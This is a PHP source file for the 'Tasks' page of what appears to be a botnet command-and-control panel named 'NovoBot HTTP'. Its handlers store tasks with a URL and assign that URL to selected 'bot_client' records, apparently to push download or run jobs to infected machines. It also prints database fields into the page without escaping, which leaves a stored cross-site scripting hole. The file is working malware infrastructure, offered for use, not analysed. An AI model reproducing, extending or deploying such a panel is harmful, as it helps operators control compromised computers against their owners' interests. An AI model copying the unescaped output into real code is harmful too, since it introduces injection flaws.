<?php
session_start();
include "connection.php";

if (isset($_SESSION['user_session'])) {

	$token = $_SESSION['user_session'];

	$stmt = $conn -> prepare('SELECT * FROM bot_main WHERE user_token=:user_token');
	$stmt -> execute(array(':user_token' => $token));
	$userRow = $stmt -> fetch(PDO::FETCH_ASSOC);

	if ($stmt -> rowCount() <= 0) {
		header("Location: ./index.php");
		exit();
	}

} else {
	header("Location: ./index.php");
	exit();
}

if (isset($_POST['id']) && isset($_POST['type'])) {

	if ($_POST['type'] == "info") {

		$stmt = $conn -> prepare("SELECT * FROM bot_tasks WHERE id=:id");
		$stmt -> execute(array("id" => $_POST['id']));
		$clientRow = $stmt -> fetch(PDO::FETCH_ASSOC);

		exit($clientRow['name']);
	}

	if ($_POST['type'] == "name") {

		$stmt = $conn -> prepare("SELECT * FROM bot_tasks WHERE id=:id");
		$stmt -> execute(array("id" => $_POST['id']));
		$clientRow = $stmt -> fetch(PDO::FETCH_ASSOC);

		exit($clientRow['name']);
	}
	if ($_POST['type'] == "comment") {

		$stmt = $conn -> prepare("SELECT * FROM bot_tasks WHERE id=:id");
		$stmt -> execute(array("id" => $_POST['id']));
		$clientRow = $stmt -> fetch(PDO::FETCH_ASSOC);

		exit($clientRow['comment']);
	}
	if ($_POST['type'] == "url") {

		$stmt = $conn -> prepare("SELECT * FROM bot_tasks WHERE id=:id");
		$stmt -> execute(array("id" => $_POST['id']));
		$clientRow = $stmt -> fetch(PDO::FETCH_ASSOC);

		exit($clientRow['url']);
	}

	if ($_POST['type'] == "del") {
		$stmt = $conn -> prepare("DELETE FROM bot_tasks WHERE id=:id");
		$stmt -> execute(array("id" => $_POST['id']));
		$clientRow = $stmt -> fetch(PDO::FETCH_ASSOC);

		exit("OK");
	}
	
	if ($_POST['type'] == "task") {

		if ($_POST['client'] == "0") {
			$stmt = $conn->prepare("INSERT INTO bot_tasks (name, comment, url) VALUES (:name, :comment, :url)");
			$stmt->execute(array("name" => $_POST['name'], "comment" => $_POST['comment'], "url" => $_POST['url']));
			
			exit("Task ". $_POST['name']. " added");
		} else {
			$arr = explode(",", $_POST['client']);
			foreach ($arr as $key => $value) {
				$stmt = $conn->prepare("UPDATE bot_client SET task_url = :task_url WHERE id=:id");
				$stmt->execute(array("task_url" => $_POST['url'], "id" => $value));
			}
			exit("Task ". $_POST['name']. " added with limit");
		}
	}
}
?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
		<title>Tasks</title>

		<!-- Bootstrap -->
		<link href="css/bootstrap.min.css" rel="stylesheet">

		<style type="text/css">
			body {
				padding-top: 70px;
				background: #666;
			}
		</style>

		<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
		<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
		<!--[if lt IE 9]>
		<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
		<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
		<![endif]-->
	</head>
	<body>

		<nav class="navbar navbar-default navbar-fixed-top">
			<div class="container">
				<div class="navbar-header">
					<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
						<span class="sr-only">Toggle navigation</span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
					</button>
					<a class="navbar-brand" href="#">NovoBot HTTP</a>
				</div>
				<div id="navbar" class="navbar-collapse collapse">
					<ul class="nav navbar-nav navbar-right">
						<li>
							<a href="./panel.php">Panel</a>
						</li>
						<li class="active">
							<a href="./task.php">Tasks</a>
						</li>
						<li>
							<a href="./settings.php">Settings</a>
						</li>
					</ul>
				</div><!--/.nav-collapse -->
			</div>
		</nav>

		<div class="container">

			<div class="panel panel-primary">
				<div class="panel-heading">
					Add Task
				</div>
				<div class="panel-body">
					<div class="form-group">
  						<label for="tsk-name">Task Name:</label>
						<input type="text" class="form-control" id="task-name">
						</div>

					<div class="form-group">
						<label for="tsk-comment">Extra Comments:</label>
						<textarea class="form-control" rows="5" id="task-comment"></textarea>
					</div>
							
					<div class="form-group">
  						<label for="tsk-url">Task Url:</label>
						<input type="url" class="form-control" id="task-url">
					</div>
					<div class="form-group">
  						<label for="tsk-client">Task Clients (Seperated by ','):</label>
						<input type="text" class="form-control" id="task-client" value="0">
					</div>
					<button type="button" class="btn btn-warning btn-task-confirm">
						Add Task
					</button>
				</div>
			</div>

			<div class="panel panel-primary">
				<div class="panel-heading">
					Tasks
				</div>
				<div class="panel-body" id="client-table">

					<table class="table table-bordered table-striped table-responsive" style="background: #fafafa;">
						<thead>
							<tr>
								<th>#</th>
								<th>Name</th>
								<th>Url</th>
								<th>Creation Date</th>
								<th>Options</th>
							</tr>
						</thead>
						<tbody>
							<?php
							$stmt = $conn -> query("SELECT * FROM bot_tasks");
							while ($taskRow = $stmt -> fetch(PDO::FETCH_ASSOC)) {
							?>
							<tr id="<?php echo $taskRow['id']; ?>">
								<td><?php echo $taskRow['id']; ?></td>
								<td><?php echo $taskRow['name']; ?></td>
								<td><?php echo $taskRow['url']; ?></td>
								<td><?php echo $taskRow['create_time']; ?></td>
								<td>
								<button type="button" class="btn btn-primary btn-sm btn-task" data-toggle="modal" data-target="#modal-view">
									View
								</button>
								<button type="button" class="btn btn-danger btn-sm btn-del" data-toggle="modal" data-target="#modal-del">
									Delete
								</button></td>
							</tr>
							<?php
							}
							?>
						</tbody>
					</table>

				</div>

			</div>


			<!-- Delete Modal -->
			<div id="modal-del" class="modal fade" role="dialog">
				<div class="modal-dialog">

					<!-- Modal content-->
					<div class="modal-content">
						<div class="modal-header">
							<button type="button" class="close" data-dismiss="modal">
								&times;
							</button>
							<h4 class="modal-title" id="modal-del-header">Delete: Jhon (127.0.0.1)</h4>
						</div>
						<div class="modal-body">
							<input type="hidden" id="client-del-id" value="0" />
							<p>
								Are you sure you want to delete the task?
							</p>
						</div>
						<div class="modal-footer">
							<button type="button" class="btn btn-danger btn-del-confirm" data-dismiss="modal">
								Yes
							</button>
							<button type="button" class="btn btn-default" data-dismiss="modal">
								No
							</button>
						</div>
					</div>
				</div>
			</div>

			<!-- View Modal -->
			<div id="modal-view" class="modal fade" role="dialog">
				<div class="modal-dialog">

					<!-- Modal content-->
					<div class="modal-content">
						<div class="modal-header">
							<button type="button" class="close" data-dismiss="modal">
								&times;
							</button>
							<h4 class="modal-title" id="modal-task-header">Add Task: Jhon (127.0.0.1)</h4>
						</div>
						<div class="modal-body">
							
							<input type="hidden" id="client-task-id" value="0" />
							
							<p id="modal-task-body"></p>

						</div>
						<div class="modal-footer">
							<p id="modal-task-url"></p>
						</div>
					</div>
				</div>
			</div>

			<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
			<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
			<!-- Include all compiled plugins (below), or include individual files as needed -->
			<script src="js/bootstrap.min.js"></script>

			<script type="text/javascript">
				$(".btn-del").click(function() {
					var cid = $(this).closest("tr").attr("id");
					$.post("task.php", {
						id : cid,
						type : "info"
					}, function(result) {
						$("#modal-del-header").html(result);
						$("#client-del-id").val(cid);
					});
				});
				$(".btn-task").click(function() {
					var cid = $(this).closest("tr").attr("id");
					$.post("task.php", {
						id : cid,
						type : "name"
					}, function(result) {
						$("#modal-task-header").html(result);
						$("#client-task-id").val(cid);
					});
					$.post("task.php", {
						id : cid,
						type : "comment"
					}, function(result) {
						$("#modal-task-body").html(result);
						$("#client-task-id").val(cid);
					});
					$.post("task.php", {
						id : cid,
						type : "url"
					}, function(result) {
						$("#modal-task-url").html(result);
						$("#client-task-id").val(cid);
					});
				});

				$(".btn-del-confirm").click(function() {
					var cid = $("#client-del-id").val();
					$.post("task.php", {
						id : $("#client-del-id").val(),
						type : "del"
					}, function(result) {
						$("tr#" + cid).remove();
					});
				});
				
				$(".btn-task-confirm").click(function() {
					
					if (!$('#task-name').val() || !$('#task-comment').val() || !$('#task-url').val()) {
						alert("Please try again");
					} else {
						var cid = $("#client-task-id").val();
						$.post("task.php", {
							id: cid,
							name: $("#task-name").val(),
							comment: $("#task-comment").val(),
							url: $("#task-url").val(),
							client: $("#task-client").val(),
							type: "task"
						}, function(result) {
	        				alert(result);
	    				});
	    			}
				});
			</script>
	</body>
</html>